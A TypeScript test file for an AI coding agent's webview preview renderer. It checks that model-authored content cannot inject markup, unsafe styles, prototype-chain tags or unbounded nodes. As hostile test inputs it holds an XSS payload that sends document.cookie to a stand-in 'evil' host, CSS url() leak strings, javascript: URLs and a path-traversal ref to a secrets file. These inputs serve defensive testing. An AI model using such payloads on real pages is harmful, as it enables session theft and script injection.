/**
 * Mysti - AI Coding Agent
 * Copyright (c) 2025 DeepMyst Inc. All rights reserved.
 *
 * SPDX-License-Identifier: Apache-2.0
 *
 * Plan 22 §3.4 — the parent-side static renderer.
 *
 * `preview.ts` draws MODEL-AUTHORED content into the PARENT webview document —
 * the one holding the view token and `acquireVsCodeApi`. So the bulk of these
 * tests are adversarial: a hostile `text`, `style`, `src`, `tag`, prop or theme
 * token, and the shapes (enormous, deeply nested, malformed) that would let a
 * page hang or crash the board rather than merely look wrong.
 */
import { describe, it, expect } from 'vitest';
import {
  renderPreview, mountPreview, drawPreview, sanitizeStyleValue, normalizeStyleProp,
  PREVIEW_ATTRS, SAFE_TAGS,
} from '../../src/webview/canvas/preview';
import type { DocNode } from '../../src/canvas/doc/DocNode';
import { FakeDocument, FakeElement } from './canvasFakeDom';
import type { DomDocument, DomElement } from '../../src/webview/canvas/dom';

const asDoc = (d: FakeDocument): DomDocument => d as unknown as DomDocument;
const asEl = (e: FakeElement): DomElement => e as unknown as DomElement;

function node(partial: Partial<DocNode> & { tag: string }): DocNode {
  return { mid: 'aaaaaaaaaa', ...partial };
}

describe('preview: shape and content', () => {
  it('renders a UI primitive tree into inert tags with text as text', () => {
    const doc = node({
      tag: 'UI.Screen',
      children: [
        node({ mid: 'bbbbbbbbbb', tag: 'UI.Heading', text: 'Welcome back' }),
        node({ mid: 'cccccccccc', tag: 'UI.Button', props: { label: 'Sign in' } }),
      ],
    });
    const { root } = renderPreview(doc);
    expect(root.tag).toBe('div');
    expect(root.attrs['data-ui']).toBe('Screen');
    expect(root.children[0].tag).toBe('h2');
    expect(root.children[0].text).toBe('Welcome back');
    // A primitive's `label` prop becomes a text child, not an attribute.
    expect(root.children[1].children[0].text).toBe('Sign in');
  });

  it('mounts through textContent only — never innerHTML', () => {
    const fake = new FakeDocument();
    const host = new FakeElement('div');
    const doc = node({ tag: 'div', children: [node({ mid: 'bbbbbbbbbb', tag: 'p', text: 'hello' })] });
    // FakeElement.innerHTML throws on read AND write; reaching it fails here.
    expect(() => drawPreview(asEl(host), doc, asDoc(fake))).not.toThrow();
    expect(host.allText()).toBe('hello');
  });

  it('stamps data-mid only when asked, and only for well-formed mids', () => {
    const doc = node({ mid: 'k7f2xq5b3m', tag: 'div' });
    expect(renderPreview(doc, { markMids: true }).root.attrs['data-mid']).toBe('k7f2xq5b3m');
    expect(renderPreview(doc).root.attrs['data-mid']).toBeUndefined();
    const hostile = node({ mid: '"><script>' as string, tag: 'div' });
    expect(renderPreview(hostile, { markMids: true }).root.attrs['data-mid']).toBeUndefined();
  });

  it('renders slots after children, in a stable order', () => {
    const doc = node({
      tag: 'UI.AppShell',
      children: [node({ mid: 'mmmmmmmmmm', tag: 'p', text: 'main' })],
      slots: {
        topBar: [node({ mid: 'tttttttttt', tag: 'p', text: 'top' })],
        sidebar: [node({ mid: 'ssssssssss', tag: 'p', text: 'side' })],
      },
    });
    const { root } = renderPreview(doc);
    expect(root.children.map(c => c.text)).toEqual(['main', 'side', 'top']);
  });
});

/**
 * CANVAS-P3-3 / Plan 22 risk 3 — the two renderers must not disagree.
 *
 * `resources/canvas-sandbox/ui-primitives.js` renders `UI.Button` and
 * `UI.SidebarItem` as `[p.icon, p.label || p.children]` — a populated `label`
 * BEATS children — and `harness.js renderChildren` hands `node.text` in as the
 * children argument. This renderer did the opposite: it pushed `label` as a
 * text child and then let `node.text` overwrite everything. So a double-click
 * text edit on a button read "Sign up" in every preview and "Sign in" in the
 * live frame the human was actually looking at, forever.
 */
describe('preview: primitive text precedence matches the live frame', () => {
  const both = (tag: string): DocNode =>
    node({ tag, props: { label: 'Sign in' }, text: 'Sign up' });

  it('lets a populated label beat text on UI.Button and UI.SidebarItem', () => {
    for (const tag of ['UI.Button', 'UI.SidebarItem']) {
      const { root } = renderPreview(both(tag));
      expect(root.text, `${tag}: DocNode.text must not win over label`).toBeUndefined();
      expect(root.children.map(c => c.text), tag).toEqual(['Sign in']);
    }
  });

  it('drops children when the label wins, exactly as `p.label || p.children` does', () => {
    const { root } = renderPreview(node({
      tag: 'UI.Button',
      props: { label: 'Sign in' },
      children: [node({ mid: 'bbbbbbbbbb', tag: 'span', text: 'lost' })],
    }));
    expect(root.children.map(c => c.text)).toEqual(['Sign in']);
  });

  it('still renders text / children when the label prop is absent or empty', () => {
    for (const props of [undefined, { label: '' }, { label: 42 as unknown as string }]) {
      const withText = renderPreview(node({ tag: 'UI.Button', ...(props ? { props } : {}), text: 'Sign up' }));
      // `label: 42` is a real value the frame WOULD render, so it wins there too.
      const expected = props && props.label === 42 ? undefined : 'Sign up';
      expect(withText.root.text).toBe(expected);
    }
    const kids = renderPreview(node({
      tag: 'UI.SidebarItem',
      children: [node({ mid: 'bbbbbbbbbb', tag: 'span', text: 'Home' })],
    }));
    expect(kids.root.children.map(c => c.text)).toEqual(['Home']);
  });

  it('leaves the primitives that agree alone (Badge / Heading / Text)', () => {
    // `Badge` is `p.children || p.label`, and `Heading`/`Text` are children-only
    // — for all three, `node.text` is what the frame renders.
    for (const tag of ['UI.Badge', 'UI.Heading', 'UI.Text']) {
      expect(renderPreview(both(tag)).root.text, tag).toBe('Sign up');
    }
  });
});

/**
 * The `__proto__` class, DOM side. `TAG_MAP` and `PRIMITIVES` are object
 * literals indexed with a MODEL-AUTHORED string, so `tag: 'constructor'`
 * resolved `Object` off the prototype chain and `tag: 'UI.__proto__'` resolved
 * `Object.prototype` as a "primitive spec" — leaving `PreviewNode.tag` a
 * function / undefined rather than the string its type promises.
 */
describe('preview: a hostile tag cannot walk the prototype chain', () => {
  it('always produces a string tag from the allowlist', () => {
    for (const tag of [
      'constructor', 'toString', '__proto__', 'valueOf', 'hasOwnProperty',
      'UI.constructor', 'UI.__proto__', 'UI.toString', 'UI.hasOwnProperty',
    ]) {
      const { root } = renderPreview(node({ tag }));
      expect(typeof root.tag, `${tag} produced a non-string tag`).toBe('string');
      expect(SAFE_TAGS.has(root.tag), `${tag} escaped the tag allowlist`).toBe(true);
    }
  });

  it('mounts one of them without throwing and with no smuggled attribute', () => {
    const fake = new FakeDocument();
    const host = new FakeElement('div');
    drawPreview(asEl(host), node({ tag: 'UI.constructor', text: 'hi' }), asDoc(fake));
    const el = host.children[0];
    expect(el.tag).toBe('div');
    for (const name of el.attrs.keys()) { expect(PREVIEW_ATTRS.has(name)).toBe(true); }
  });
});

describe('preview: hostile text is neutralized', () => {
  it('carries markup verbatim as TEXT, never as parsed nodes', () => {
    const payload = '<img src=x onerror="fetch(`https://evil/?t=`+document.cookie)">';
    const fake = new FakeDocument();
    const host = new FakeElement('div');
    drawPreview(asEl(host), node({ tag: 'p', text: payload }), asDoc(fake));
    const p = host.find(e => e.tag === 'p');
    expect(p?.textContent).toBe(payload);
    // No <img> element was ever created — the string never reached a parser.
    expect(fake.countTag('img')).toBe(0);
    expect(host.findAll(e => e.tag === 'script')).toHaveLength(0);
  });

  it('strips control characters and clamps runaway text', () => {
    const withControls = `a${String.fromCharCode(0)}b${String.fromCharCode(27)}c`;
    expect(renderPreview(node({ tag: 'p', text: withControls })).root.text).toBe('abc');
    const long = 'x'.repeat(9000);
    const out = renderPreview(node({ tag: 'p', text: long }), { maxTextLength: 100 }).root.text ?? '';
    expect(out.length).toBeLessThanOrEqual(104);
  });

  it('never sets an attribute outside the four-name allowlist', () => {
    const fake = new FakeDocument();
    const host = new FakeElement('div');
    // Hand-built PreviewNode: the last-moment filter must still hold.
    mountPreview(
      asEl(host),
      { tag: 'div', attrs: { onclick: 'alert(1)', href: 'javascript:alert(1)', 'data-mid': 'aaaaaaaaaa' }, style: {}, children: [] },
      asDoc(fake),
    );
    const el = host.children[0];
    expect([...el.attrs.keys()]).toEqual(['data-mid']);
    for (const name of el.attrs.keys()) { expect(PREVIEW_ATTRS.has(name)).toBe(true); }
  });
});

describe('preview: hostile tags', () => {
  it('never produces script / style / iframe / object, whatever the doc says', () => {
    for (const tag of ['script', 'style', 'iframe', 'object', 'embed', 'link', 'meta', 'base']) {
      const { root } = renderPreview(node({ tag }));
      expect(root.tag).toBe('div');
      expect(SAFE_TAGS.has(root.tag)).toBe(true);
    }
  });

  it('renders interactive tags as inert boxes (no navigation, no submit)', () => {
    expect(renderPreview(node({ tag: 'a', props: { href: 'https://evil' } })).root.tag).toBe('span');
    expect(renderPreview(node({ tag: 'form' })).root.tag).toBe('div');
    expect(renderPreview(node({ tag: 'button' })).root.tag).toBe('div');
    // ...and the href never survives as an attribute.
    expect(renderPreview(node({ tag: 'a', props: { href: 'https://evil' } })).root.attrs.href).toBeUndefined();
  });
});

describe('preview: hostile styles', () => {
  it('refuses url(), expression() and CSS-escaped variants', () => {
    expect(sanitizeStyleValue('background', 'url(https://evil/?leak=1)')).toBeNull();
    expect(sanitizeStyleValue('background', 'URL ( https://evil )')).toBeNull();
    expect(sanitizeStyleValue('width', 'expression(alert(1))')).toBeNull();
    expect(sanitizeStyleValue('background', 'image-set("https://evil")')).toBeNull();
    // A backslash could spell `url` past a substring check, so it is refused.
    expect(sanitizeStyleValue('background', '\\75 rl(https://evil)')).toBeNull();
    expect(sanitizeStyleValue('color', 'javascript:alert(1)')).toBeNull();
  });

  it('refuses declaration-breakout and at-rule attempts', () => {
    expect(sanitizeStyleValue('color', 'red; background: url(https://evil)')).toBeNull();
    expect(sanitizeStyleValue('color', 'red} body{display:none')).toBeNull();
    expect(sanitizeStyleValue('color', '</style><script>alert(1)</script>')).toBeNull();
    expect(sanitizeStyleValue('color', '@import url(https://evil)')).toBeNull();
  });

  it('allows theme tokens and ordinary values', () => {
    expect(sanitizeStyleValue('background', 'var(--theme-color-surface)')).toBe('var(--theme-color-surface)');
    expect(sanitizeStyleValue('padding', '12px 16px')).toBe('12px 16px');
    expect(sanitizeStyleValue('color', 'rgba(0,0,0,0.5)')).toBe('rgba(0,0,0,0.5)');
    expect(sanitizeStyleValue('font-family', "'Source Serif 4', Georgia, serif"))
      .toBe("'Source Serif 4', Georgia, serif");
  });

  it('refuses position:fixed/sticky so a tile cannot cover the app chrome', () => {
    expect(sanitizeStyleValue('position', 'fixed')).toBeNull();
    expect(sanitizeStyleValue('position', 'sticky')).toBeNull();
    expect(sanitizeStyleValue('position', 'absolute')).toBe('absolute');
  });

  it('drops unknown style properties and normalizes camelCase', () => {
    expect(normalizeStyleProp('backgroundColor')).toBe('background-color');
    expect(normalizeStyleProp('--sneaky')).toBeNull();
    expect(normalizeStyleProp('a'.repeat(200))).toBeNull();
    const { root, stats } = renderPreview(node({
      tag: 'div',
      style: { backgroundColor: '#fff', behavior: 'url(x.htc)', '-moz-binding': 'url(x)' },
    }));
    expect(root.style['background-color']).toBe('#fff');
    expect(root.style.behavior).toBeUndefined();
    expect(stats.dropped).toBeGreaterThanOrEqual(2);
  });

  it('writes styles through setProperty, never a style attribute', () => {
    const fake = new FakeDocument();
    const host = new FakeElement('div');
    drawPreview(asEl(host), node({ tag: 'div', style: { color: '#111' } }), asDoc(fake));
    const el = host.children[0];
    expect(el.style.get('color')).toBe('#111');
    expect(el.attrs.has('style')).toBe(false);
  });
});

describe('preview: images resolve only asset://', () => {
  const resolveAsset = (ref: string) => `https://file+.vscode-resource.test/${ref.slice('asset://'.length)}`;

  it('resolves a well-formed asset ref', () => {
    const { root } = renderPreview(node({ tag: 'img', props: { src: 'asset://abc123.png', alt: 'shot' } }), { resolveAsset });
    expect(root.attrs.src).toBe('https://file+.vscode-resource.test/abc123.png');
    expect(root.attrs.alt).toBe('shot');
  });

  it('refuses every non-asset scheme without consulting the resolver', () => {
    let consulted = 0;
    const spy = (ref: string) => { consulted++; return ref; };
    for (const src of [
      'https://evil/pixel.gif',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'asset://../../../.mysti/secrets.json',
      'ASSET://abc.png',
    ]) {
      const { root } = renderPreview(node({ tag: 'img', props: { src } }), { resolveAsset: spy });
      expect(root.attrs.src).toBeUndefined();
    }
    expect(consulted).toBe(0);
  });

  it('refuses a resolver that returns a dangerous URL', () => {
    const bad = renderPreview(node({ tag: 'img', props: { src: 'asset://a.png' } }), {
      resolveAsset: () => 'javascript:alert(1)',
    });
    expect(bad.root.attrs.src).toBeUndefined();
    const nullish = renderPreview(node({ tag: 'img', props: { src: 'asset://a.png' } }), { resolveAsset: () => null });
    expect(nullish.root.attrs.src).toBeUndefined();
  });

  it('never gives an img children', () => {
    const { root } = renderPreview(node({
      tag: 'img',
      props: { src: 'asset://a.png' },
      children: [node({ mid: 'bbbbbbbbbb', tag: 'p', text: 'nope' })],
    }), { resolveAsset });
    expect(root.children).toHaveLength(0);
  });
});

describe('preview: bounded work', () => {
  it('truncates a node bomb instead of hanging the board', () => {
    const kids: DocNode[] = [];
    for (let i = 0; i < 5000; i++) { kids.push(node({ mid: `n${i}`, tag: 'div' })); }
    const { stats } = renderPreview(node({ tag: 'div', children: kids }), { maxNodes: 200 });
    expect(stats.truncated).toBe(true);
    expect(stats.nodes).toBeLessThanOrEqual(201);
  });

  it('truncates a deep chain instead of blowing the stack', () => {
    let deep: DocNode = node({ mid: 'leaf000000', tag: 'div', text: 'bottom' });
    for (let i = 0; i < 4000; i++) { deep = node({ mid: `d${i}`, tag: 'div', children: [deep] }); }
    const { stats } = renderPreview(deep, { maxDepth: 30, maxNodes: 100000 });
    expect(stats.truncated).toBe(true);
  });

  it('survives structurally malformed nodes', () => {
    const junk = { mid: 'aaaaaaaaaa' } as unknown as DocNode;
    expect(() => renderPreview(junk)).not.toThrow();
    const nullChildren = { mid: 'aaaaaaaaaa', tag: 'div', children: [null, undefined] } as unknown as DocNode;
    expect(() => renderPreview(nullChildren)).not.toThrow();
  });

  it('ignores children when a malformed node carries both text and children', () => {
    const both = node({ tag: 'div', text: 'text wins', children: [node({ mid: 'bbbbbbbbbb', tag: 'p', text: 'lost' })] });
    const { root } = renderPreview(both);
    expect(root.text).toBe('text wins');
    expect(root.children).toHaveLength(0);
  });
});
